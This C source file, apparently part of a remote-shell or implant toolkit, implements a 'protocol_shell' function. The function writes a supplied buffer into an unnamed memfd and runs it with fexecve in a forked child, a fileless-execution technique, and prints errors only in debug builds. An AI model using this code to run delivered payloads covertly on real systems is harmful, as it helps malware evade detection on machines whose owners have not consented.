#define _GNU_SOURCE /* See feature_test_macros(7) */
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <linux/memfd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <unistd.h>

#include "shell.h"
#include "../common/rtl_common.h"

extern int protocol_shell(uint32_t method, unsigned char *buf,
                          uint32_t buf_size, unsigned char *argv_buf,
                          unsigned char *envp_buf) {

  unsigned char **argv = rtl_parse_protocol_argument_buffer(argv_buf);
  unsigned char **envp = rtl_parse_protocol_argument_buffer(envp_buf);

  // function table, would be nice - prob. break things out and clean this up
  // at somepoint...

  if (method == RTL_PROTOCOL_SHELL_METHOD_MEMFD) {
    int a = memfd_create("", 0);

    if (a == -1) {
#ifdef DEBUG
      perror("memfd_create");
#endif
      exit(EXIT_FAILURE);
    }

    if (ftruncate(a, buf_size) == -1) {
#ifdef DEBUG
      perror("ftruncate");
#endif
      exit(EXIT_FAILURE);
    }

    if (write(a, buf, buf_size) == -1) {
#ifdef DEBUG
      perror("write");
#endif
      exit(EXIT_FAILURE);
    }

    pid_t pid = fork();
    if (pid == 0) {

      if (fcntl(a, F_SETFL, O_RDONLY) == -1) {
#ifdef DEBUG
        perror("fcntl");
#endif
        exit(EXIT_FAILURE);
      }

      if (fexecve(a, (char *const *)argv, (char *const *)envp) == -1) {
#ifdef DEBUG
        perror("fexecve");
#endif
        exit(EXIT_FAILURE);
      }
    } else if (pid == -1) {
#ifdef DEBUG
      perror("fork");
#endif
      exit(EXIT_FAILURE);
    }

    if (wait(NULL) == -1) {
#ifdef DEBUG
      perror("wait");
#endif
      exit(EXIT_FAILURE);
    }

    return close(a);
  }

  if (method == RTL_PROTOCOL_SHELL_METHOD_TMPFS) {
#ifdef DEBUG
    perror("not implemented- yet...");
#endif
    exit(EXIT_FAILURE);
  }

  return EXIT_FAILURE;
}